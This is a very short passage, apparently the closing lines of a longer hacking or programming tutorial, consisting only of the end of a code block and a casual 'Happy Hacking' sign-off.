```

So thats it 

enjoy and Happy Hacking :)
